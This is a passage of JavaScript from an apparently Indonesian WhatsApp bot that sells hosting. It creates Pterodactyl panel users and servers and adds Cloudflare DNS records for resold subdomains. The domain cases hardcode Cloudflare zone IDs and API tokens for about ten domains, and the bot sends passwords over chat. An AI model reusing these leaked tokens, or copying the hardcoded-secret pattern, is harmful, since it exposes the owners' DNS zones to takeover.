let egg = "15"
let loc = "1"
let memo = "5120"
let cpu = "130"
let disk = "5120"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await rizzpiw.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : youtu.be/3s9CLUWjIMI
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT ZANSXD BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT ZANSXD

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
rizzpiw.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break
case "6gb": {
if (!isSeler && !isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "6144"
let cpu = "150"
let disk = "6144"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await rizzpiw.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : youtu.be/3s9CLUWjIMI
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT ZANSXD BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT ZANSXD

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
rizzpiw.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────`)

}

break

case "unli": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await rizzpiw.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : youtu.be/3s9CLUWjIMI
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT ZANSXD BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT ZANSXD

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
rizzpiw.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break

//--------------------------------------------------------------------------------------------------\\
//Domain 1 - 14
//Bagian Domain 

case 'domain1': {
 
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ab732313828957ac4dfa9dd05ecdbea4";
               let apitoken = "wLoUr4uAAk_l2zOW03A_ePS0ishGEeLCjZrIXCdC";
               let tld = "jasa-panel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break

           case 'domain2': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
               let apitoken = "A4E0OuHCDuUy09QCENX2t6suDS5EIIi3urJO101r";
               let tld = "didinsec.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break

case 'domain3': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "edf8e5a66859e6a1f8ccbde07c415082";
               let apitoken = "p0gm6UzsPw0Y0eudhfDr1ZBvV_WjX9eMpTp4ksXZ";
               let tld = "didindev.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break

           case 'domain4': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d41a17e101c0f89f0aec609c31137f91";
               let apitoken = "fjYUs5uWqoZBU-4fCfqiqXHXhdRRrr2Lc2GZ0dOj";
               let tld = "sellerpannel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
break

case 'domain5': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a6c9cf9cd38077e52db6874200c5c0c4";
               let apitoken = "DyQW84WhtZwTfWZCanO-MQNd6gglRwDHOmK8KRF2";
               let tld = "panellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain6': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "512f917ecb9e0d4eb0085458fdcc95ee";
               let apitoken = "a4hizwK6UjIi8MBEscAOVNG-njTDfJejAhOJlOFh";
               let tld = "panellku.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break

           case 'domain7': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b268933cdea4ffd662bc56dd84e46e21";
               let apitoken = "v80Y6QMWDamHAg-u18z8IEMBp1kpodn_lZkyduJ8";
               let tld = "panellku.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break

           case 'domain8': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c8a876bc10af3ce5ab11f2209121cf63";
               let apitoken = "O8uR00EP6u4Rp9TtmwCSASwfkEHAIaNw2DVmIgAD";
               let tld = "panellku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain9': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4dab40fe5183e4c6bd7b9fd87582803c";
               let apitoken = "95QUM8iFtLPZA-CgZplgvg19LhY-_QwxYdFNdotp";
               let tld = "mypanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain10': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fbb7300781a84b11d6db8767d59c";
               let apitoken = "jS5iwULl-Yr5H7miIYWhWVkF-4j5p1RzjwjyN";
               let tld = "panellku.art";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
